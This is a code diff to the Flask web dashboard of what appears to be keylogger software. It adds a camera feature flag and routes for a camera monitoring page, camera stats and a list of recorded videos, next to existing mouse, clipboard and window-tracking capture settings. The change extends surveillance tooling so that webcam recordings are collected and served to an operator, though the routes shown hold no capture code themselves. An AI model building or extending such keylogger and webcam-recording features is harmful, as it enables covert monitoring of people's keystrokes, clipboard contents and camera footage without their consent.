@@ -109,6 +109,7 @@ def create_web_app(keylogger_core, config_manager):
                 'mouse': config_manager.get('features.mouse', config_manager.get('features.mouse_logging', True)),
                 'clipboard': config_manager.get('features.clipboard', config_manager.get('features.clipboard_logging', False)),
                 'window_tracking': config_manager.get('features.window_tracking', True),
+                'camera': config_manager.get('features.camera', config_manager.get('camera.enabled', False)),
             }
 
             # System info
@@ -240,7 +241,7 @@ def create_web_app(keylogger_core, config_manager):
         except Exception as e:
             logger.exception("Error loading performance")
             return render_template('error.html', error_title='Performance Error', error_message=str(e))
-    
+
     @app.route('/api/performance')
     @login_required
     def api_performance():
@@ -250,6 +251,48 @@ def create_web_app(keylogger_core, config_manager):
         except Exception as e:
             logger.exception("Error in performance API")
             return jsonify({'error': str(e)}), 500
+
+    # Camera routes
+    @app.route('/camera')
+    @login_required
+    def camera():
+        """Camera monitoring page."""
+        try:
+            return render_template('camera.html')
+        except Exception as e:
+            logger.exception("Error loading camera page")
+            return render_template('error.html', error_title='Camera Error', error_message=str(e))
+
+    @app.route('/api/camera/stats')
+    @login_required
+    def api_camera_stats():
+        """API endpoint for camera stats."""
+        try:
+            enabled = bool(config_manager.get('features.camera', config_manager.get('camera.enabled', False)))
+            cm = getattr(keylogger_core, 'camera_monitor', None)
+            if cm is not None:
+                stats = cm.get_stats()
+                stats['enabled'] = enabled
+                return jsonify({'success': True, 'stats': stats})
+            return jsonify({'success': True, 'stats': {'enabled': enabled, 'is_running': False}})
+        except Exception as e:
+            logger.exception("Error in camera stats API")
+            return jsonify({'success': False, 'error': str(e)}), 500
+
+    @app.route('/api/camera/videos')
+    @login_required
+    def api_camera_videos():
+        """API endpoint for recent camera videos."""
+        try:
+            limit = request.args.get('limit', default=25, type=int)
+            cm = getattr(keylogger_core, 'camera_monitor', None)
+            if cm is not None:
+                vids = cm.get_video_list(limit=limit)
+                return jsonify({'success': True, 'videos': vids})
+            return jsonify({'success': True, 'videos': []})
+        except Exception as e:
+            logger.exception("Error in camera videos API")
+            return jsonify({'success': False, 'error': str(e)}), 500
     
     @app.route('/test')
     def test_route():
